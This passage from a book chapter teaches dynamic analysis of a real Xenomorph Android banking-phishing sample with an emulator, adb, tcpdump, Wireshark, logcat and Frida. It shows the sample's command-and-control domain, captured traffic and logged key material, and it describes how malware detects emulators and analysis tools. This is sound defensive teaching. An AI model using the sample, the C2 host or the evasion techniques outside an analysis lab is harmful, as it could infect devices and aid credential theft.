<html><head></head><body>
<div id="book-content">
<div id="sbo-rt-content"><h2 class="h2" id="ch04"><span epub:type="pagebreak" id="page_115"/><strong><span class="big">4</span><br/>DYNAMIC ANALYSIS</strong></h2>&#13;
<div class="image1"><img src="../images/common.jpg" alt="Image" width="189" height="189"/></div>&#13;
<p class="noindentsa">This chapter uses a malware sample from the Xenomorph phishing family, first described by Dutch security company ThreatFabric in March 2022, to introduce popular dynamic analysis tools for Android and best practices for using these tools. We cover the use of a device emulator to run the malicious app, as well as the use of tcpdump, Wireshark, and Frida to learn about the app’s behavior.</p>&#13;
<p class="indent">In any serious reverse engineering context, analysts use static and dynamic techniques in tandem to speed up malware analysis. Thus, toward the end of this chapter, we’ll supplement our dynamic analysis with static analysis in jadx. You’ll witness how to use dynamic analysis to gain a broad understanding of a piece of malware functionality, then seek out additional information through static analysis.</p>&#13;
<h3 class="h3" id="ch04lev1"><strong>What Is Dynamic Code Analysis?</strong></h3>&#13;
<p class="noindent">In program analysis and reverse engineering, the term <em>dynamic analysis</em> or <em>dynamic code analysis</em> refers to the application of analysis techniques that <span epub:type="pagebreak" id="page_116"/>uncover properties of the program under observation by executing its code. This contrasts with static analysis, described in the previous chapter, which aims to discover properties of a program by analyzing its code and structure without executing it.</p>&#13;
<p class="indent">Of course, running an app is not enough to understand what the app is doing. Dynamic analysis involves a whole arsenal of tools that monitor and interact with the app, including debuggers and software to intercept API calls, dump memory, or inspect network traffic. Still other tools might implement ways to interact with the app’s GUI or automatically test the app’s security properties for potential vulnerabilities. When run together, these tools should build a picture of how an app interacts with a device. The more tools you deploy to monitor the device, the more complete your understanding of the app becomes. However, deploying and maintaining all of these tools can take considerable time and money.</p>&#13;
<h3 class="h3" id="ch04lev2"><strong>Dynamic vs. Static Analysis</strong></h3>&#13;
<p class="noindent">Dynamic and static analysis are complements. To get a full picture of an app’s functionality, you’ll need to use both forms of analysis, and all professional malware analysis programs do so.</p>&#13;
<p class="indent">An example of the stark differences between static and dynamic analysis is the amount of effort required to set them up. For static analysis, you only have to load an app into jadx. On the other hand, dynamic analysis requires first setting up a device (real or virtual) that can execute the program, then making sure you have the ability to intercept and log system calls, network traffic, filesystem changes, and any other device modifications that the app could make. Finally, you have to execute the app and interact with it in the hopes of triggering malicious functionality. This can be more difficult than you might expect, as malware apps often deploy myriad anti-analysis tricks and refuse to run when they believe they are under analysis in a security researcher’s test environment.</p>&#13;
<p class="indent">Once you have overcome all of these obstacles and have an app running on your test device, however, dynamic analysis shines. It is much faster to make progress than with static analysis, as you can observe what the app is doing and try to force its execution in any direction that interests you. Your analysis system will log all sensitive API calls, network traffic, and environmental information and put the details into a report for you to study later. There is no need to slog through all the app code, as with static analysis.</p>&#13;
<p class="indent">Another place where dynamic and static analysis complement each other is in terms of <em>code coverage</em>, a measure of how much code an analysis technique can analyze. In static analysis, all of an app’s code is available for analysis. In dynamic analysis, you can only consider the executed code. The difference between the two can be huge. Even the best dynamic analysis runs of an app struggle to execute more than 5 to 10 percent of an app’s code. The remaining 90 to 95 percent remains a mystery and can only be uncovered by static analysis.</p>&#13;
<h3 class="h3" id="ch04lev3"><span epub:type="pagebreak" id="page_117"/><strong>The Android Studio Emulator</strong></h3>&#13;
<p class="noindent">The first tool you’ll have to set up for dynamic analysis is the runtime environment in which to execute the app. You can choose to use either a real Android device or an emulated one. Next, you must select the device type and configuration and, if you’re using an emulator, whether to use the default emulator that comes with the Android SDK or a third-party one.</p>&#13;
<p class="indent">Using an emulator is cheap and allows you to quickly reset your analysis if something goes wrong. You can also get started easily. On the other hand, most Android malware tries to detect whether it’s running in an emulator and behaves differently if it thinks it’s under analysis, which can lead to you wasting large amounts of time. If you use a real device, you’ll breeze past these checks.</p>&#13;
<p class="indent">We’ll use the standard Android emulator that ships with the Android Studio IDE and the Android SDK for the dynamic analysis in this chapter. We recommend installing Android Studio in its entirety, as it sets up the necessary SDK packages for you and provides a nice user interface. Installing just the Android SDK works too, but it requires a lot more fiddling around. You can download Android Studio at <a href="https://developer.android.com/studio"><em>https://developer.android.com/studio</em></a>. Follow the instructions at <a href="https://developer.android.com/studio/install"><em>https://developer.android.com/studio/install</em></a> to install it.</p>&#13;
<h4 class="h4" id="ch04lev1sec1"><strong><em>Creating a System Image</em></strong></h4>&#13;
<p class="noindent">Before you can start the emulator, you must first create a system image that the emulator can boot. The most comfortable way to do this is by using Android Studio. Access the device manager configuration screen by selecting <strong>Tools</strong> ▸ <strong>Device Manager</strong>. The device manager will walk you through creating system images for the Android emulator.</p>&#13;
<p class="indent">Here, we use a system image configured for a Pixel XL device with API 30, compiled for a 32-bit x86 architecture. We chose this architecture to make the emulator faster, as these images can use a real computer’s CPU virtualization features. Choosing an ARM processor image is slower, as an x86 host machine would have to emulate the ARM architecture. Of course, if you’re running an ARM-based host computer, you should choose an ARM-based Android system image, for the same reason.</p>&#13;
<h4 class="h4" id="ch04lev1sec2"><strong><em>Starting the Emulator</em></strong></h4>&#13;
<p class="noindent">While it’s possible to start the Android emulator from Android Studio, we prefer to run it from the command line. This provides us with a whole range of command line options that aren’t easily accessible from Android Studio.</p>&#13;
<p class="indent">Here’s a quick way to start the emulator:</p>&#13;
<pre>$ <span class="codestrong1">emulator @Pixel_XL_API_30 -no-boot-anim</span></pre>&#13;
<p class="indent">This command takes just two arguments. We use <span class="literal">@</span> to pass the name of the API 30 Pixel XL system image created in Android Studio in the previous <span epub:type="pagebreak" id="page_118"/>step. The second argument, <span class="literal">-no-boot-anim</span>, disables the system boot animation to boot up the system faster.</p>&#13;
<h4 class="h4" id="ch04lev1sec3"><strong><em>Resetting the Emulator</em></strong></h4>&#13;
<p class="noindent">During your dynamic analysis, you’ll often want to return to a clean slate by removing all artifacts created by previous runs of the malware from the system. Otherwise, you might get confused about where certain malware artifacts came from if you can’t tie them to anything that happened during the most recent run.</p>&#13;
<p class="indent">The easiest way to get back to a clean slate is to wipe all data from the Android emulator and reset it to its original state. The emulator provides the handy <span class="literal">-wipe-data</span> command line argument for that:</p>&#13;
<pre>$ <span class="codestrong1">emulator @Pixel_XL_API_30 -wipe-data -no-boot-anim</span></pre>&#13;
<p class="indent">We highly recommend making liberal use of this argument between malware runs.</p>&#13;
<h4 class="h4" id="ch04lev1sec4"><strong><em>Interacting with the Emulator</em></strong></h4>&#13;
<p class="noindent">To interact with the emulated device, we will use the Android Debug Bridge command line tool, adb, which ships with the Android SDK and can communicate with devices over USB or TCP/IP. This tool supports a dozen or so commands that you can learn more about by running <span class="literal">adb --help</span>. Throughout this chapter, we’ll use adb commands to install apps on the device, upload files to it, and download files from it.</p>&#13;
<div class="box5">&#13;
<p class="boxtitle-d"><strong>EMULATORS AND ANTI-ANALYSIS TECHNIQUES</strong></p>&#13;
<p class="noindentt">Hundreds of dynamic anti-analysis techniques published on the internet attempt to detect emulators. These techniques range from fairly simple to quite sophisticated. For example, the default Android emulator does not attempt to hide itself. Rather, it broadcasts that it’s an emulator through system properties like its device model (set to <span class="literal">goldfish</span>) and its emulated mobile carrier (set to <span class="literal">Android</span>). Malware can easily detect that it’s running on this emulator by checking these system properties or by looking at the CPU architecture of the device it’s running on. There are nearly no real x86 Android devices, so anytime an app is running on an x86 CPU, it’s probably on an emulated device.</p>&#13;
<p class="noindentt">But apps don’t have to rely on these default values or hardware properties to detect emulators. Some may check whether popular apps like Facebook are installed on the device. Facebook is found on nearly all real devices but rarely on emulators. Other apps check whether the user’s SMS and web browsing history resemble a real user’s or are empty, like on a newly spun-up emulator. In even more extreme cases, apps can run code to evaluate timing properties of memory access. Emulated memory behaves differently at the hardware level than real, physical memory.</p>&#13;
<p class="noindentt"><span epub:type="pagebreak" id="page_119"/>Many publicly documented anti-analysis techniques target the dynamic analysis tools frequently installed on emulators. Usually, these techniques attempt to detect files, processes, or other system properties that are only present when a dynamic analysis tool is installed. In particular, malware can detect the powerful Frida tool used in this chapter in various ways.</p>&#13;
<p class="noindentt">In a professional malware analysis lab, the cat-and-mouse game between apps trying to detect dynamic analysis tools and lab developers trying to hide them is one of the most time-consuming aspects of the profession. In the worst-case scenario, malware developers can upload malware files that specifically target your lab. These apps enumerate the system properties of your devices and send the information back to the malware developers, who then build anti-analysis techniques specifically for your equipment.</p>&#13;
</div>&#13;
<h3 class="h3" id="ch04lev4"><strong>Dynamic Analysis Tools</strong></h3>&#13;
<p class="noindent">Besides the Android emulator, we’ll use several third-party applications in our analysis: tcpdump, to intercept and log network traffic from the emulator; Wireshark, to analyze that network traffic; and Frida, to manipulate the malware we analyze.</p>&#13;
<h4 class="h4" id="ch04lev1sec5"><strong><em>tcpdump</em></strong></h4>&#13;
<p class="noindent">The tcpdump command line tool is a network traffic logger and analyzer. We’ll use it to capture all network traffic sent between the malware and its command-and-control server so that we can inspect the data that the malware collects and the commands it receives.</p>&#13;
<p class="indent">As tcpdump is an open source tool, you can download it from <a href="https://tcpdump.org"><em>https://tcpdump.org</em></a>. The official website distributes source code only, so you’ll have to compile it for the Android CPU architecture of your test device. Instructions for compiling tcpdump can be found in the official GitHub repository, at <a href="https://github.com/the-tcpdump-group/tcpdump/blob/master/INSTALL.md"><em>https://github.com/the-tcpdump-group/tcpdump/blob/master/INSTALL.md</em></a>. Third-party websites also host precompiled tcpdump binaries for different Android CPU architectures, but we don’t know how trustworthy these third-party sites are, so proceed with caution.</p>&#13;
<p class="indent">Next, install tcpdump on Android with adb by pushing the binary to the device and marking it as executable:</p>&#13;
<pre>$ <span class="codestrong1">adb push tcpdump /data/local/tmp</span>&#13;
$ <span class="codestrong1">adb shell chmod +x /data/local/tmp/tcpdump</span></pre>&#13;
<p class="indent">The <span class="literal">adb push</span> command transfers a file from the host computer to the Android device, and <span class="literal">adb shell</span> executes shell commands on the device. Please note that Android uses the MirBSD Korn Shell (mksh), which might behave differently from the more popular Bash shell to which you are probably accustomed.</p>&#13;
<h4 class="h4" id="ch04lev1sec6"><span epub:type="pagebreak" id="page_120"/><strong><em>Wireshark</em></strong></h4>&#13;
<p class="noindent">Wireshark is an open source network traffic analyzer. We’ll use it as a GUI for the data captured by tcpdump. You can download it from its official website, <a href="https://wireshark.org"><em>https://wireshark.org</em></a>. Because you’ll install Wireshark on your host system, not on the Android emulator, choose the installer for your host system. For example, if you are running Windows, install Wireshark for Windows.</p>&#13;
<h4 class="h4" id="ch04lev1sec7"><strong><em>Frida</em></strong></h4>&#13;
<p class="noindent">Frida is a dynamic instrumentation toolkit that you can use to analyze running applications, log what they execute, and manipulate them at runtime. It is open source and supports many different operating systems and executable file formats. The official way to install Frida is to use pip, a package installer for the Python programming language, so as a prerequisite to using Frida, you must first install the latest versions of Python 3 and pip from <a href="https://python.org"><em>https://python.org</em></a> and <a href="https://pypi.org/project/pip/"><em>https://pypi.org/project/pip/</em></a>. Next, install Frida by running <span class="literal">pip install frida-tools</span>.</p>&#13;
<p class="indent">Like adb, Frida uses a client/server architecture: a server binary (<span class="literal">frida-server</span>) runs on the Android device, and a client (<span class="literal">frida</span>) runs on the host machine to interact with the Android device. Download <span class="literal">frida-server</span> from Frida’s GitHub page (<a href="https://github.com/frida/frida"><em>https://github.com/frida/frida</em></a>), which offers precompiled binaries for many different operating systems and CPU architectures, then install it on the Android device using adb and make the file executable:</p>&#13;
<pre>$ <span class="codestrong1">adb push frida-server /data/local/tmp</span>&#13;
$ <span class="codestrong1">adb shell chmod +x /data/local/tmp/frida-server</span></pre>&#13;
<h3 class="h3" id="ch04lev5"><strong>The Malware Sample</strong></h3>&#13;
<p class="noindent">Now that we’ve installed our dynamic analysis tools, we can begin our analysis. We’ll look at an Android malware sample called <em>com.spike.old</em> (v1, 2877). This malware, which masquerades as a device cleaner utility, was never directly found on Google Play. Rather, its distributors uploaded a separate malware dropper app, <em>vizeeva.fast.cleaner</em> (v4, 8f50), which downloaded and installed <em>com.spike.old</em>.</p>&#13;
<p class="indent">This phishing application of the Xenomorph family has some interesting properties that we will explore in this chapter. It targets banks across the world, as well as some other apps whose login credentials have value to the malware developers. When users interact with the legitimate bank apps, the malware tries to phish for the user’s credentials by faking a login dialog that looks like it comes from the legitimate app.</p>&#13;
<p class="indent">To begin our analysis, download the malware file from <a href="https://github.com/android-malware-ml-book"><em>https://github.com/android-malware-ml-book</em></a>. Then install the app on the emulator using <span epub:type="pagebreak" id="page_121"/>the <span class="literal">adb install</span> command, which takes an APK file on the host machine, uploads it to the Android device, and initiates the installation process:</p>&#13;
<pre>$ <span class="codestrong1">adb install com.spike.old.apk</span></pre>&#13;
<p class="indent">You can find an installed app’s private data in the <em>/data/data/&lt;package name&gt;</em> directory. Immediately after you’ve installed the app, this directory exists but is empty, as you can see by inspecting it with the commands shown here:</p>&#13;
<pre>$ <span class="codestrong1">adb root</span>&#13;
restarting adbd as root&#13;
$ <span class="codestrong1">adb shell find /data/data/com.spike.old</span>&#13;
/data/data/com.spike.old&#13;
/data/data/com.spike.old/cache&#13;
/data/data/com.spike.old/code_cache</pre>&#13;
<p class="indent">The first command, <span class="literal">adb root</span>, restarts the adb daemon (<span class="literal">adbd</span>) on the device with root privileges. You must do this to access the private files of apps that are protected by Android’s process isolation security guarantees. The output shows three default directories that were created during installation, but no files yet. In future malware analysis, you can skip this directory check, as the layout of app directories is always the same.</p>&#13;
<h3 class="h3" id="ch04lev6"><strong>Detecting Malicious Functionality</strong></h3>&#13;
<p class="noindent">Now we’ll execute the app while our dynamic analysis tools run in the background to monitor what it’s doing. This workflow is the essence of dynamic analysis, and the approach of this section mirrors the steps taken to find entry points in <a href="ch03.xhtml">Chapter 3</a>. The difference is that instead of looking for structural properties of the app (like permissions, APIs, or entry points), we’re now observing different effects of the malware on its environment and using these as clues for further analysis of the malware’s functionality. Concretely, we will look at how the malware interacts with the emulator’s filesystem, its network connections, and the system log.</p>&#13;
<p class="indent">To run the app, you can either start it through the app drawer in the emulator, like a regular user, or use the command line with adb’s somewhat obscure app starting command:</p>&#13;
<pre>$ <span class="codestrong1">adb shell monkey -p com.spike.old 1</span></pre>&#13;
<p class="indent">Originally developed for app testing, <span class="literal">monkey</span> is a helper program on Android that simulates a real user interacting with the target app. Here, we only use its capability to start a given app by name. The trailing <span class="literal">1</span> refers to the number of user interface events we want <span class="literal">monkey</span> to simulate in the target process. In our case, we only need to start the app once.</p>&#13;
<p class="indent">Now that the app is running, it should display the screen shown in <a href="ch04.xhtml#ch4fig1">Figure 4-1</a>.<span epub:type="pagebreak" id="page_122"/></p>&#13;
<div class="image"><img id="ch4fig1" src="../images/ch04fig01.jpg" alt="Image" width="270" height="469"/></div>&#13;
<p class="figcap"><em>Figure 4-1:  The first screen of the malicious sample</em></p>&#13;
<p class="indent">As you can see, the app tries to convince the user to grant it access to the powerful accessibility API. A click of the large circular button at the bottom opens the system dialog, where the user can give the app this permission. For now, we won’t grant access to the accessibility permission or go deeper into the application. Instead, we’ll move on to the next step of the analysis.</p>&#13;
<h4 class="h4" id="ch04lev1sec8"><strong><em>Observing Filesystem Changes</em></strong></h4>&#13;
<p class="noindent">Now that the app is running, we can take another look at its default file directory. To make this output more useful, let’s refine the <span class="literal">adb</span> command to dump the file types of all files in this directory. The quotation marks are necessary due to the trailing semicolon:</p>&#13;
<pre>$ <span class="codestrong1">adb shell "find /data/data/com.spike.old -type f -exec file {} \;"</span>&#13;
./cache/WebView/Crashpad/settings.dat: data&#13;
./cache/WebView/Default/HTTP Cache/Code Cache/wasm/index: data&#13;
./cache/WebView/Default/HTTP Cache/Code Cache/wasm/index-dir/the-real-index: data&#13;
./cache/WebView/Default/HTTP Cache/Code Cache/js/index: data&#13;
./cache/WebView/Default/HTTP Cache/Code Cache/js/index-dir/the-real-index: data&#13;
./cache/WebView/font_unique_name_table.pb: data&#13;
./app_DynamicOptDex/hq.json: Zip archive data, requires at least v2.0 to extract&#13;
./app_DynamicOptDex/oat/hq.json.cur.prof: data&#13;
./shared_prefs/ring0.xml: ASCII text&#13;
./shared_prefs/WebViewChromiumPrefs.xml: ASCII text&#13;
./app_webview/variations_seed_new: empty&#13;
<span epub:type="pagebreak" id="page_123"/>./app_webview/webview_data.lock: data&#13;
./app_webview/variations_stamp: empty&#13;
./app_webview/Default/Web Data: data&#13;
./app_webview/Default/Web Data-journal: empty&#13;
./app_webview/Default/GPUCache/index: data&#13;
./app_webview/Default/GPUCache/index-dir/the-real-index: data&#13;
./app_webview/pref_store: ASCII text</pre>&#13;
<p class="indent">The output shows the creation of a lot of new files. Many of these are boilerplate files created by Android, but two stand out. The first is <em>shared_prefs/ring0.xml</em>, which seems to be a joke name: ring zero is the highest privilege level for execution on some computers. The other is <em>app_Dynamic OptDex/hq.json</em>, which has a file extension that implies it is a text file. However, the <span class="literal">file</span> command has indicated that it’s a ZIP file. We should investigate this mismatch between the declared file extension and the file’s contents.</p>&#13;
<h4 class="h4" id="ch04lev1sec9"><strong><em>Downloading Files for Inspection</em></strong></h4>&#13;
<p class="noindent">For further inspection of the files dumped by the app, we can download all of them from the device to the host computer with <span class="literal">adb pull</span>. This command can download both individual files and entire directories:</p>&#13;
<pre>$ <span class="codestrong1">adb pull /data/data/com.spike.old</span></pre>&#13;
<p class="indent">Now let’s perform a quick inspection of the two suspicious files:</p>&#13;
<pre>$ <span class="codestrong1">cat com.spike.old/shared_prefs/ring0.xml</span> &#13;
&lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;&#13;
&lt;map&gt;&#13;
    &lt;string name="ANCT"&gt;simpleyo5.tk&lt;/string&gt;&#13;
    &lt;string name="NSTG"&gt;4&lt;/string&gt;&#13;
    &lt;string name="AITT"&gt;&lt;/string&gt;&#13;
    &lt;string name="AIEN"&gt;1&lt;/string&gt;&#13;
&lt;/map&gt;&#13;
&#13;
$ <span class="codestrong1">xxd -l 48 com.spike.old/app_DynamicOptDex/hq.json</span> &#13;
00000000: 504b 0304 1400 0808 0800 34a2 4854 0000  PK........4.HT..&#13;
00000010: 0000 0000 0000 0000 0000 0b00 0000 636c  ..............cl&#13;
00000020: 6173 7365 732e 6465 782c d707 d8ce d5ff  asses.dex,......</pre>&#13;
<p class="indent">The <em>ring0.xml</em> file seems to contain configuration settings of unknown meaning, but with an interesting domain name. The <em>hq.json</em> file seems to contain DEX code, as indicated by the <em>classes.dex</em> string. Presumably, the malware writes this file to disk and loads it.</p>&#13;
<p class="indent">At this point, we have leads into the malware that we could chase down. What is the suspicious domain in the XML file? What do the other configuration options mean? Where does the DEX file come from, and what does it <span epub:type="pagebreak" id="page_124"/>do? For now, we won’t pursue these leads. Instead, we’ll use other dynamic analysis tools to learn more about the malware.</p>&#13;
<div class="note">&#13;
<p class="notet"><strong><span class="notes">NOTE</span></strong></p>&#13;
<p class="notep"><em>Apps can also access other parts of the filesystem. In particular, many apps write data to Android’s shared external storage. For brevity, we have omitted a discussion of the malware’s interaction with these storage areas, but a complete dynamic analysis should cover this.</em></p>&#13;
</div>&#13;
<h4 class="h4" id="ch04lev1sec10"><strong><em>Capturing Network Traffic</em></strong></h4>&#13;
<p class="noindent">Another target of dynamic analysis is network traffic. We can capture and analyze this traffic to find out where malware sends data to and where it receives it from. This can provide important insights into the commands the malware can execute and what sensitive data it may attempt to steal.</p>&#13;
<p class="indent">Before capturing network traffic, it’s important to reset the emulated device to a clean state. Otherwise, the app may not repeat some network requests that already happened during prior runs. What if, for example, the DEX code file <em>hq.json</em> was downloaded from the internet? The app might not download the file again, as it’s already present on disk. You’d be stumped if you wanted to understand the origins of this DEX file.</p>&#13;
<p class="indent">Of course, after you wipe the device, you’ll need to again upload the tcpdump file to the emulator and make it executable. This task can quickly get tedious if you find yourself resetting the emulator regularly. We recommend putting all the emulator configuration commands into a shell script that you can easily execute after wiping it.</p>&#13;
<p class="indent">To capture network data, we use the <span class="literal">adb exec-out</span> command to run the <span class="literal">tcpdump</span> executable on the emulator. We then use <span class="literal">adb exec-out</span> to transfer binary data from the emulator to the host system, piping it into Wireshark for easy consumption. It’s worth noting that network traffic can only be captured if <span class="literal">adbd</span> runs as root on the device. If you haven’t put <span class="literal">adbd</span> into root mode after resetting the emulator, now is a good time to do that:</p>&#13;
<pre>$ <span class="codestrong1">adb root</span>&#13;
$ <span class="codestrong1">adb exec-out "/data/local/tmp/tcpdump -i any -U -w - 2&gt;/dev/null" | wireshark -k -S -i -</span></pre>&#13;
<p class="indent">We use the tcpdump command line option <span class="literal">-i any</span> to capture traffic from any network interface. The combination of <span class="literal">-U</span> and <span class="literal">-w</span> makes sure that captured packets are immediately written to the output file. The Wireshark command line arguments <span class="literal">-k -S</span> immediately start capturing and displaying packets. The <span class="literal">-i -</span> argument tells Wireshark to expect network packets to come from stdin, which is where they get piped from adb.</p>&#13;
<p class="indent">Note that this command captures all network traffic from the device, meaning that the captured data doesn’t necessarily come from the malware under analysis. If other processes make network connections, their traffic will be captured, too. On a freshly reset device, this is usually not a problem, as barely any apps are running and the operating system makes very few network connections. To get a better understanding of the default network <span epub:type="pagebreak" id="page_125"/>connections on your Android device, you could capture the network traffic without running the malware or any other app.</p>&#13;
<h4 class="h4" id="ch04lev1sec11"><strong><em>Analyzing Network Traffic</em></strong></h4>&#13;
<p class="noindent">Once tcpdump and Wireshark are up and running, we can start looking at the captured traffic. <a href="ch04.xhtml#ch4fig2">Figure 4-2</a> shows an example of a Wireshark session with packets captured during a run of <em>com.spike.old</em>. The top third of the Wireshark window shows a summary of all captured network packets. The middle third shows parsed information about the selected HTTP network packet. The lower third shows a hex dump of the selected packet’s payload.</p>&#13;
<div class="image"><img id="ch4fig2" src="../images/ch04fig02.jpg" alt="Image" width="845" height="497"/></div>&#13;
<p class="figcap"><em>Figure 4-2: Wireshark showing captured network traffic from the malicious app</em></p>&#13;
<p class="indent">Some of the information from <a href="ch04.xhtml#ch4fig2">Figure 4-2</a> is reproduced in <a href="ch04.xhtml#ch4lis1">Listing 4-1</a> to make it more readable. In particular, we’ve chosen to show the structured information about the HTTP packet.</p>&#13;
<pre>Frame 22: 272 bytes on wire (2176 bits), &#13;
    272 bytes captured (2176 bits) on interface -, id 0&#13;
Linux cooked capture v1&#13;
Internet Protocol Version 4, Src: 10.0.2.16, Dst: 23.184.48.153&#13;
Transmission Control Protocol, Src Port: 35938, Dst Port: 80, Seq: 7301,&#13;
    Ack: 1, Len: 216&#13;
[6 Reassembled TCP Segments (7516 bytes): #17(1460), #18(1460),&#13;
    #19(1460), #20(1460), #21(1460), #22(216)]&#13;
Hypertext Transfer Protocol&#13;
    POST /ping HTTP/1.1\r\n&#13;
    Content-Type: application/json; charset=UTF-8\r\n&#13;
    Content-Length: 7331\r\n&#13;
    Host: simpleyo5.tk\r\n&#13;
    Connection: Keep-Alive\r\n&#13;
    Accept-Encoding: gzip\r\n&#13;
    User-Agent: okhttp/4.2.1\r\n&#13;
    \r\n&#13;
    [Full request URI: http://simpleyo5.tk/ping]&#13;
    [HTTP request 1/1]&#13;
    [Response in frame: 29]&#13;
    File Data: 7331 bytes&#13;
JavaScript Object Notation: application/json&#13;
&#13;
0000   7b 22 68 61 73 68 22 3a 22 50 42 66 69 48 48 38   {"hash":"PBfiHH8&#13;
0010   37 4d 66 54 2b 34 4c 31 68 79 34 62 6c 49 30 6d   7MfT+4L1hy4blI0m&#13;
0020   5a 6a 2f 79 33 55 33 46 68 32 4a 78 6d 48 7a 43   Zj/y3U3Fh2JxmHzC&#13;
0030   48 72 67 4d 3d 22 2c 22 69 64 22 3a 22 54 33 6c   HrgM=","id":"T3l&#13;
0040   50 46 72 45 42 42 54 55 51 46 52 64 62 32 33 43   PFrEBBTUQFRdb23C&#13;
0050   77 44 74 6a 79 50 37 4e 33 51 34 48 75 4d 68 4e   wDtjyP7N3Q4HuMhN&#13;
0060   54 2b 55 38 6e 6a 6a 6b 69 39 59 73 70 4d 46 49   T+U8njjki9YspMFI</pre>&#13;
<p class="list" id="ch4lis1"><span epub:type="pagebreak" id="page_126"/><em>Listing 4-1: Details of a captured network connection in Wireshark</em></p>&#13;
<p class="indent">From this, we learn that the intercepted packet is an HTTP POST request to <em>http://simpleyo5.tk/ping</em>, a URL on the same domain we previously saw in the suspicious configuration file, <em>ring0.xml</em>. The abbreviated hex dump at the bottom of the listing shows that the POST payload (the data sent to the domain) appears to be JSON-formatted text with keys <span class="literal">hash</span> and <span class="literal">id</span> and what appear to be Base64-encoded values.</p>&#13;
<p class="indent">Capturing network traffic proved to be a successful strategy. We’ve confirmed that the malware uses the domain <em>simpleyo5.tk</em>, and that JSON and Base64-encoded data gets sent to the domain’s <em>/ping</em> endpoint. We also know some of the plaintext JSON keys. We’ll add these insights to our collection of leads to pursue later.</p>&#13;
<h4 class="h4" id="ch04lev1sec12"><strong><em>Analyzing Logs with Logcat</em></strong></h4>&#13;
<p class="noindent">One powerful source of information is Android’s system-wide log, which the operating system and apps use to log debug data, error messages, and other information. Careless malware developers who use the default logging system to debug their apps may forget to remove log statements in their final release and inadvertently give away a lot of information.</p>&#13;
<p class="indent">Luckily for us, <em>com.spike.old</em> is one of those apps. It makes heavy use of logging, and the information it logs is so detailed that we’ve intentionally placed this section after our discussions of network capture and filesystem analysis to avoid giving away too much information.</p>&#13;
<p class="indent">The standard way to access the Android system log is to use the logcat tool, for example, through the <span class="literal">adb logcat</span> command. By default, logcat dumps the whole system logfile, which is usually many thousands <span epub:type="pagebreak" id="page_127"/>of lines. To filter out irrelevant details, we can specify the process ID of the app under observation, as shown here:</p>&#13;
<pre>$ <span class="codestrong1">adb shell ps | grep com.spike.old</span>&#13;
u0_a121        3711    303 1328880 194572 do_epoll_wait       0 S com.spike.old&#13;
$ <span class="codestrong1">adb logcat --pid=3711</span></pre>&#13;
<p class="indent">We first query for the malware’s process ID (in our case, 3711) and then tell logcat to only include lines with this ID. As we mentioned, the <span class="literal">logcat</span> command returns way too much useful information to print here. However, a sneak peek is shown in <a href="ch04.xhtml#ch4lis2">Listing 4-2</a>. Yes, the app really dumps the encryption parameters for its command-and-control communications to the system log. Usually, you won’t get this lucky during malware analysis.</p>&#13;
<pre>14:10:33.739  3711  3739 D pioneer_bridge_over_white_rabbits &#13;
    (ApiVerifyRequestBody): key: 5f 9e 4a 92 b1 d8 c8 b9 8d b9 b7 f8 f8 80 0d 2e &#13;
14:10:33.739  3711  3739 D pioneer_bridge_over_white_rabbits (&#13;
    ApiVerifyRequestBody): url: 73 69 6d 70 6c 65 79 6f 35 2e 74 6b 2f 70 69 6e 67 &#13;
14:10:33.740  3711  3739 D pioneer_bridge_over_white_rabbits &#13;
    (ApiVerifyRequestBody): uid: 64 dc 5b 59 e5 46 53 8f</pre>&#13;
<p class="list" id="ch4lis2"><em>Listing 4-2: The logcat output for</em> com.spike.old</p>&#13;
<p class="indent">The string <span class="literal">pioneer_bridge_over_white_rabbits</span> is noteworthy. It’s a debug string used by the app as a prefix for its logs. Why the app includes it is unclear. Elsewhere in the log data (but omitted here), you can find information about the network payloads, a mapping of encrypted and decrypted JSON objects, fairly detailed information about which classes are executed, and more.</p>&#13;
<p class="indent">One advantage of logcat is that the operating system buffers and preserves its log for a while. This means that you don’t need to monitor logcat while the app is running: it’s possible to grab information from the system log long after the app under analysis has stopped executing. Because logcat is size-limited, the availability of an app’s data depends on how many log entries are generated on an Android device before earlier log entries get culled. In practice, usually they remain available for a few hours.</p>&#13;
<h3 class="h3" id="ch04lev7"><strong>Analysis with Frida</strong></h3>&#13;
<p class="noindent">So far, we’ve used the tools adb, logcat, tcpdump, and Wireshark to quickly discover properties of the app under observation. However, these tools don’t allow us to link the observed app properties back to concrete sections of the app’s code. We now know that <em>com.spike.old</em> dumps files to disk, connects to a command-and-control server, and encrypts its communication, but we don’t know any details about where, why, or how it does any of this. We can use Frida to make these connections.</p>&#13;
<p class="indent">Frida is a powerful tool, and an explanation of all of its functions could fill a whole other book. Here, we’ll only cover those that further our understanding of the malicious sample. In particular, we’ll use <span class="literal">frida-trace</span> to <span epub:type="pagebreak" id="page_128"/>quickly understand which interesting Java APIs the malware uses. We’ll also use Frida scripting to find these interesting APIs in the malware’s code. Curious readers are encouraged to read more about Frida’s many uses, as this chapter covers only about 1 percent of the tool’s capabilities.</p>&#13;
<h4 class="h4" id="ch04lev1sec13"><strong><em>Running frida-server</em></strong></h4>&#13;
<p class="noindent">You should have already installed <span class="literal">frida-server</span> on the device and made it executable. Now you must run it so that it can communicate with the <span class="literal">frida</span> client on the host system and interact with the malware. We’ll use <span class="literal">adb shell</span> again to run <span class="literal">frida-server</span>:</p>&#13;
<pre>$ <span class="codestrong1">adb root</span>&#13;
$ <span class="codestrong1">adb shell /data/local/tmp/frida-server</span></pre>&#13;
<p class="indent">One caveat is that <span class="literal">frida-server</span> must run with root privileges.</p>&#13;
<h4 class="h4" id="ch04lev1sec14"><strong><em>Using frida-trace to Find Interesting APIs</em></strong></h4>&#13;
<p class="noindent">The <span class="literal">frida-trace</span> tool can dynamically trace method calls in the app under observation and dump some basic properties about the APIs it uses. The tool expects a list of methods to intercept, and it sends these methods’ inputs and outputs to stdout. It supports regular expressions, making the monitoring of all methods of a class, or even a package, a breeze. For example, the following command dumps information about how the malware uses all methods in the classes <span class="literal">Cipher</span> and <span class="literal">SecretKeySpec</span> from the default Java cryptography package:</p>&#13;
<pre>$ <span class="codestrong1">frida-trace -U -j 'javax.crypto.Cipher!*' \&#13;
                 -j 'javax.crypto.spec.SecretKeySpec!*' \&#13;
                 -f com.spike.old</span></pre>&#13;
<p class="indent">This command outputs hundreds of lines of information about the use of this cryptography API. <a href="ch04.xhtml#ch4lis3">Listing 4-3</a> shows a tiny part. We can see how the malware sets up an AES encryption key and an initialization vector (IV), and then uses the cipher defined by these properties to decrypt a byte array.</p>&#13;
<pre>  1222 ms  Cipher.getIV()&#13;
  1222 ms     | Cipher.updateProviderIfNeeded()&#13;
